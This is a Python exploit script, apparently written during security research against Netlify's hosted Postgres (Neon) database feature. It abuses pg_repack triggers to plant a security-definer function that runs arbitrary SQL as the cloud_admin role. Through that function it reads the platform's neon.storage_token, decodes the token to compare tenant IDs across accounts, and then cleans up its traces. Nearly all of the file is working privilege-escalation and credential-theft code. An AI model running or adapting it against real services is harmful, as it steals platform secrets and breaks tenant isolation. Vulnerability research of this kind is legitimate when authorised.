# -*- coding: utf-8 -*-
"""B 库:重搭链读取 neon.storage_token,对比 tenant_id 是否与 A 相同
流程:ext -> src/oid -> pk/log -> evil(k_run) -> 双触发 -> insert
      -> k_run 读 token(payload 解码只打印 tenant 部分)
      -> 正确顺序清理(保留触发器重放 evil2 删 k_run -> 自清理 -> drop ext -> 巡检)
"""
import http.client, ssl, gzip, brotli, json, sys, time, re, base64
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_B

SITE_B = 'd2977de0-d24d-4544-81cb-933e610cad7d'
ctx = ssl.create_default_context()
P = '/.netlify/functions/database-query'


def tx(qs, timeout=60):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0',
         'Accept-Encoding': 'br, gzip', 'Accept': 'application/json', 'Cookie': COOKIE_B,
         'Content-Type': 'application/json'}
    body = {'siteId': SITE_B, 'action': 'transaction', 'queries': [{'sql': x} for x in qs]}
    conn.request('POST', P, body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    out = raw[:9000].decode('utf-8', 'ignore')
    conn.close()
    return st, out


def q(sql):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=60)
    h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0',
         'Accept-Encoding': 'br, gzip', 'Accept': 'application/json', 'Cookie': COOKIE_B,
         'Content-Type': 'application/json'}
    body = {'siteId': SITE_B, 'action': 'query', 'sql': sql}
    conn.request('POST', P, body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    out = raw[:9000].decode('utf-8', 'ignore')
    conn.close()
    return st, out


# 1. 搭链
st, b = tx(["create extension if not exists pg_repack",
            "drop table if exists k_src",
            "create table k_src(id int, v text)",
            "select 'OID='||oid from pg_class where relname='k_src'"])
m = re.search(r'OID=(\d+)', b)
oid = m.group(1) if m else None
print('setup            oid=%s' % oid)
if not oid:
    sys.exit('no oid')

st, b = tx(["create type repack.pk_%s as (id int)" % oid,
            "create table repack.log_%s (pk repack.pk_%s, row k_src)" % (oid, oid)])
print('pk+log           [%d]' % st)

evil = ("create or replace function k_evil() returns trigger language plpgsql as $q$ "
        "begin "
        "  begin execute $f$create or replace function public.k_run(q text) returns setof text "
        "language plpgsql security definer as $z$ begin begin return query execute q; "
        "exception when others then execute q; return query select 'OK'; end; end $z$$f$; "
        "exception when others then null; end; "
        "  return new; end $q$")
st, b = tx([evil,
            "create trigger t_log after insert on repack.log_%s for each row execute function k_evil()" % oid,
            "create trigger t_src after insert on k_src for each row execute function repack.repack_trigger('id')",
            "insert into k_src values (1,'x')"])
print('chain            [%d]' % st)

# 2. 读 token(经 k_run,cloud_admin 上下文)
st, b = q("select * from public.k_run($t$select setting from pg_file_settings where name='neon.storage_token'$t$)")
print('token read       [%d]' % st)
tok = None
m = re.search(r'"k_run":"([^"]+)"', b)
if m:
    tok = m.group(1)
if tok and tok.startswith('eyJ'):
    payload = tok.split('.')[1]
    payload += '=' * (-len(payload) % 4)
    try:
        j = json.loads(base64.urlsafe_b64decode(payload))
        print('payload          %s' % json.dumps(j))
    except Exception as e:
        print('decode fail: %s | token head: %s...' % (e, tok[:80]))
else:
    print('raw: %s' % b[:500])

# 3. 清理(正确顺序:先重放删 cloud_admin 对象,再拆基础设施)
evil2 = ("create or replace function k_evil() returns trigger language plpgsql as $q$ "
         "begin "
         "  begin execute 'drop function if exists public.k_run cascade'; exception when others then null; end; "
         "  return new; end $q$")
st, b = tx([evil2,
            "insert into k_src values (2,'c')"])
print('clean_cloud      [%d]' % st)

st, b = tx(["drop trigger if exists t_src on k_src",
            "drop trigger if exists t_log on repack.log_%s" % oid,
            "drop function if exists k_evil()",
            "drop table if exists repack.log_%s" % oid,
            "drop type if exists repack.pk_%s" % oid,
            "drop table if exists k_src",
            "drop extension if exists pg_repack"])
print('clean_self       [%d]' % st)

st, b = q("select 'rel' t, n.nspname||'.'||c.relname nm from pg_class c "
          "join pg_namespace n on c.relnamespace=n.oid "
          "where (n.nspname='public' and c.relname like 'k\\_%') "
          "or (n.nspname='repack' and (c.relname like 'log\\_%' or c.relname like 'pk\\_%'))")
print('residue          [%d] %s' % (st, b[:400]))
